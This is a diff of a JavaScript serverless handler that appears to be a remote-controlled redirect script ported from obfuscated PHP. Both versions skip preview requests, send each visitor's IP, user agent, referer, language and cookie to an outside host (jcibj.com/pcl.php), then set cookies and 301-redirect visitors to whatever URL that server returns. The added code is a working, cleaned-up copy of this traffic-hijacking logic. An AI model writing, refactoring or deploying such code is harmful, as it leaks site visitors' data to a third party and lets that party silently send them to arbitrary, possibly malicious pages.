@@ -1,68 +1,78 @@
 export default async function handler(req, res) {
-  const isPreview = req.headers['x-purpose'] === 'preview';
-  if (isPreview) return res.status(204).end(); // Do nothing for preview requests
+  if (req.headers['x-purpose'] === 'preview') {
+    return res.status(204).end(); // Do nothing if preview
+  }
 
-  const date = new Date().toISOString().replace('T', ' ').split('.')[0];
+  const now = new Date().toISOString();
   const id = '499178';
   const uid = 'yrez8stiipeall2mn4qv94nec';
   const query = req.url.split('?')[1] || '';
-  const u = 'https://jcibj.com/pcl.php'; // Decoded from PHP chr() array
+  const externalUrl = 'https://jcibj.com/pcl.php';
 
   const data = {
-    date,
+    date: now,
     lan: req.headers['accept-language'] || '',
     ref: req.headers['referer'] || '',
-    ip: req.headers['x-real-ip'] || req.headers['x-forwarded-for'] || req.socket.remoteAddress,
+    ip: req.headers['x-forwarded-for'] || req.socket.remoteAddress,
     ipr: req.headers['x-forwarded-for'] || '',
-    sn: req.headers['host'] || '',
+    sn: req.headers.host || '',
     requestUri: req.url,
     query,
     ua: req.headers['user-agent'] || '',
     co: req.cookies?._event || '',
     user_id: uid,
-    id: id,
+    id,
   };
 
+  // POST request to external server
+  let response;
   try {
-    const response = await fetch(u, {
+    const fetchRes = await fetch(externalUrl, {
       method: 'POST',
-      headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
+      headers: {
+        'Content-Type': 'application/x-www-form-urlencoded',
+      },
       body: new URLSearchParams(data).toString(),
     });
 
-    const result = await response.text();
-    const arr = result.split(',');
+    response = await fetchRes.text();
+  } catch (e) {
+    return res.status(500).send('External request failed');
+  }
 
-    const [status, targetUrl, include, days, type, hasFallback, eventVal, cookieName, cookieVal, cookieDays] = arr;
+  const arr = response.split(',');
+  let redirectUrl = arr[1] || '';
+  let cookieName = arr[7];
+  let cookieVal = arr[8];
+  let cookieDays = parseInt(arr[9]) || 1;
+  let setCookieEvent = arr[6];
+  let setEventFlag = parseInt(arr[4]);
+  let cookieDuration = 60 * 60 * 24 * cookieDays;
 
-    const querySuffix = query ? (targetUrl.includes('?') ? '&' : '?') + query : '';
+  let finalQuery = '';
+  if (query) {
+    finalQuery = redirectUrl.includes('?') ? `&${query}` : `?${query}`;
+  }
 
-    if (cookieName && cookieVal && cookieDays) {
-      res.setHeader('Set-Cookie', `${cookieName}=${cookieVal}; Path=/; Max-Age=${60 * 60 * 24 * parseInt(cookieDays)}; HttpOnly`);
+  // Set cookies
+  if (arr[0] === 'true') {
+    if (cookieName) {
+      res.setHeader('Set-Cookie', `${cookieName}=${cookieVal}; Path=/; Max-Age=${cookieDuration}`);
     }
-
-    if (include === '1' || include === 'true') {
-      if (type === '1' || type === '3') {
-        res.setHeader('Set-Cookie', `_event=${eventVal}; Path=/; Max-Age=${60 * 60 * 24 * parseInt(days)}; HttpOnly`);
-      }
+    if (arr[2] && (setEventFlag === 1 || setEventFlag === 3)) {
+      res.setHeader('Set-Cookie', `_event=${setCookieEvent}; Path=/; Max-Age=${cookieDuration}`);
     }
-
-    if (status === 'true' || status === 'false') {
-      const finalUrl = status === 'false' && !hasFallback ? targetUrl : targetUrl + querySuffix;
-
-      // Set _event cookie if needed
-      if (include === '1' || include === 'true') {
-        if (type === '2' || type === '3') {
-          res.setHeader('Set-Cookie', `_event=${eventVal}b; Path=/; Max-Age=${60 * 60 * 24 * parseInt(days)}; HttpOnly`);
-        }
-      }
-
-      return res.writeHead(301, { Location: finalUrl }).end();
+    return res.redirect(301, redirectUrl + finalQuery);
+  } else if (arr[0] === 'false') {
+    if (arr[2] && (setEventFlag === 2 || setEventFlag === 3)) {
+      res.setHeader('Set-Cookie', `_event=${setCookieEvent}b; Path=/; Max-Age=${cookieDuration}`);
     }
-
-    return res.status(400).send('Unhandled redirect format');
-  } catch (err) {
-    console.error('Error:', err);
-    return res.status(500).send('Server error');
+    const redirectFinal = arr[5] ? finalQuery : '';
+    return res.redirect(301, redirectUrl + redirectFinal);
+  } else {
+    if (arr[2] && (setEventFlag === 2 || setEventFlag === 3)) {
+      res.setHeader('Set-Cookie', `_event=${setCookieEvent}b; Path=/; Max-Age=${cookieDuration}`);
+    }
+    return res.status(204).end(); // No redirection
   }
 }
